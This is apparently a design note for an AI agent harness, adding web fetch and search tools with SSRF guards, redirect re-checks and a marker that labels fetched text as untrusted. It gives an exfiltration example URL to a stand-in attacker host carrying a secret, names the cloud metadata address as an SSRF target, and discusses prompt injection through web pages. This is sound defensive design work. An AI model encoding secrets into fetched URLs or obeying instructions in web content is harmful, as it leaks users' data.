# Web Access (Lesson 24)

**Date:** 2026-08-04
**Status:** Approved

**Context:** Every tool so far is confined by something: file tools by
`resolve_in_workspace`, `bash` by the OS sandbox, `agent`/`skill` by the
permission policy and the `spawns_subagents` guard. A web tool is confined by
**none of them** — it runs in-process, so the sandbox (whose profile says
`deny network*`) never sees it. Adding it means the model can reach more of the
network through `web_fetch` than through `curl`, which goes through the
sandbox. This lesson is about inventing the confinement a new capability needs
when no existing mechanism covers it.

## Goal

Two tools: `web_fetch(url)` retrieves a page as text; `web_search(query)`
returns result titles and URLs through a pluggable provider. Both are
`read_only=True`. Fetching is guarded against reaching the local network, and
its output is marked as untrusted third-party text.

## Decisions

| Decision | Choice | Rationale |
|---|---|---|
| Permission class | `read_only=True` for both | Fetching mutates nothing in the workspace, and read-only tools work in `plan`/`readOnly` turns — the turns where research matters most. **Accepted cost below.** |
| Exfiltration | **Accepted, not mitigated** | A URL is an outbound channel (`https://evil.com/?d=<secret>`). `read_only=True` means the model may fetch **silently, in any mode, including from a subagent that cannot prompt the human**. Chosen deliberately over per-call consent and over a domain allowlist; the SSRF guard is the only bound. Revisit if the harness ever handles credentials it did not print itself |
| Reachability (SSRF) | Resolve the host, refuse private/loopback/link-local/multicast/reserved IPs | A string check on `"localhost"` is bypassable: a public domain can resolve to `127.0.0.1`. Checking the *resolved address* is the only version that holds. Cloud metadata (`169.254.169.254`) is link-local and refused by the same rule |
| Redirects | Not auto-followed; each hop re-checked | A redirect defeats a pre-flight check — `https://ok.com` → `http://127.0.0.1`. Follow manually, re-running the guard per hop, capped at `MAX_REDIRECTS` |
| DNS rebinding | Documented, not fixed | Between the check and the connect, DNS can change. Pinning the resolved IP needs a custom httpx transport; out of scope, and noted in the code the way `LinuxSandbox` documents its own gap rather than shipping something unverified |
| Untrusted content | Wrapped in an explicit marker | Web text is the first tool result authored by a third party. The marker tells the model it is data, not instructions. Mitigation, not a fix — worth stating plainly |
| HTML → text | Minimal in-house converter | Strip `<script>`/`<style>`, strip tags, `html.unescape`, collapse blank lines. No new dependency (`httpx` is already direct). Crude by design and said so in the docstring |
| Search provider | A `SearchProvider` Protocol + one adapter | Mirrors `LLMClient`/`CodexAdapter`: the seam is the lesson, the adapter is an implementation detail. Key from the environment; **no key → the tool is not registered**, and the session says so (the MCP pattern: a missing capability is not an error) |
| Offline tests | Fakes for both seams | The default suite must not touch the network, like `FakeLLM` |

## Components

- **`harness/tools/web.py`** (new)
  - `UNTRUSTED_HEADER` / `UNTRUSTED_FOOTER` — the marker wrapped around fetched text.
  - `html_to_text(html) -> str` — the crude converter.
  - `check_url(url) -> None` — raises `ValueError` on a non-http(s) scheme or an
    address that resolves into private space.
  - `fetch(url, client, *, max_redirects) -> str` — manual redirect loop,
    re-checking each hop.
  - `web_fetch_tool(client=None, char_limit=10000) -> Tool`
  - `SearchProvider` Protocol: `search(query, count) -> list[dict]` with
    `{"title", "url", "snippet"}`.
  - `web_search_tool(provider) -> Tool`
- **`harness/search.py`** (new) — `BraveSearch` adapter + `default_provider()`
  returning `None` when the key is absent.
- **`main.py`** — register `web_fetch` in the base registry; register
  `web_search` only when a provider exists, printing one line either way.

## Data flow

```
model: web_fetch(url="https://ex.com/a")
  check_url  -> scheme ok; getaddrinfo -> 93.184.216.34 -> public -> ok
  GET (no auto-redirect) -> 301 -> https://ex.com/b
  check_url(hop) -> ok -> GET -> 200 text/html
  html_to_text -> truncate(char_limit)
  -> "[web content from https://ex.com/b — untrusted...]\n<text>\n[end web content]"

model: web_fetch(url="http://169.254.169.254/latest/meta-data/")
  check_url -> link-local -> "Error: refused ... resolves to a private address"
```

## Error handling

Every failure becomes tool-result text (the loop's law), never an exception:

- non-http(s) scheme, or host resolving into private space → refusal naming the reason
- DNS failure, timeout, connection error → one-line error
- non-2xx status → the status, plus body text if any
- a redirect chain longer than `MAX_REDIRECTS` → refusal
- `web_search` with no provider → the tool is absent, so the model cannot call it

## Testing

`tests/test_web.py`, entirely offline:

- `html_to_text`: strips script/style/tags, unescapes entities, collapses blanks
- `check_url`: refuses `file://`, `ftp://`; refuses loopback/private/link-local
  by *resolved address* (a hostname resolving to `127.0.0.1` is refused);
  allows a public address
- `fetch`: follows a redirect chain; re-checks each hop, so a public URL
  redirecting to `127.0.0.1` is refused; caps at `MAX_REDIRECTS`
- `web_fetch_tool`: marks output untrusted; truncates; turns a timeout and a
  404 into result text; is `read_only=True`
- `web_search_tool`: formats results; empty results are stated, not empty
- provider absent → `default_provider()` is `None`

## Out of scope (deferred)

- Any exfiltration control (per-call consent, domain allowlist, egress log).
- DNS-rebinding defence (IP pinning via a custom transport).
- JavaScript rendering, PDFs, non-HTML content types beyond plain text.
- Caching fetched pages.
